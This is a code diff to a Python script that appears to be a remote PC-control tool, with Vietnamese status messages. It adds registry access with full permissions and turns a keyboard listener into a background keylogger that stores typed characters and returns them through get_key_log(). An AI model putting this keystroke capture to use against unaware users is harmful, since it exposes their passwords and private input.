@@ -33,7 +33,7 @@ def open_key(link):
 
     aKey = "\\".join(links)
 
-    return winreg.OpenKey(aReg, aKey)
+    return winreg.OpenKey(aReg, aKey, 0, winreg.KEY_ALL_ACCESS)
 
 
 def get_process_running():
@@ -61,15 +61,17 @@ def get_value(link, name):
     try:
         asubkey = open_key(link)
         return winreg.QueryValueEx(asubkey, name)[0]
-    except FileNotFoundError:
-        return ''
+    except Exception as e:
+        print(e)
+        return "Lỗi"
 
 def delete_value(link, name):
     try:
         asubkey = open_key(link)
         winreg.DeleteValue(asubkey, name)
         return "Xóa value thành công"
-    except FileNotFoundError:
+    except Exception as e:
+        print(e)
         return "Lỗi"
 
 def set_value(link, name, value, value_type):
@@ -92,7 +94,8 @@ def set_value(link, name, value, value_type):
         winreg.SetValueEx(asubkey, name, 0, value_type, value)
 
         return "Sửa value thành công"
-    except:
+    except Exception as e:
+        print(e)
         return "Lỗi"
 
 def create_key(link):
@@ -107,7 +110,8 @@ def create_key(link):
     try:
         winreg.CreateKey(HKEY, aKey)
         return "Tạo Key thành công"
-    except:
+    except Exception as e:
+        print(e)
         return "Lỗi"
 
 def delete_key(link):
@@ -122,38 +126,40 @@ def delete_key(link):
     try:
         winreg.DeleteKey(HKEY, aKey)
         return "Xóa Key thành công"
-    except:
+    except Exception as e:
+        print(e)
         return "Lỗi"
 
 
+key_log = ''
+listener = None
+
 def on_press(key):
-    print('{0} pressed'.format(
-        key))
-    return key
-
-
-def on_release(key):
-    print('{0} release'.format(
-        key))
-    if key == Key.esc:
-        # Stop listener
-        return False
-# Collect events until released
-
+    global key_log
+    try:
+        print('alphanumeric key {0} pressed'.format(
+            key.char))
+        key_log += key.char
+    except AttributeError:
+        pass
 
 def listening_keyboard(listening=True):
-    if listening:
-        with Listener(
-                on_press=on_press) as listener:
-            listener.join()
-        print(listener)
-        return listener
-    else:
-        return False
+    global key_log
+    global listener
 
+    if listening:
+        listener = Listener(on_press=on_press)
+        listener.start()
+    else:
+        if listener:
+            listener.stop()
+        key_log = ''
+
+def get_key_log():
+    global key_log
+
+    return key_log
 
 def shutdown_pc():
     os.system("shutdown /s /t 1")
 
-
-listening_keyboard(True)
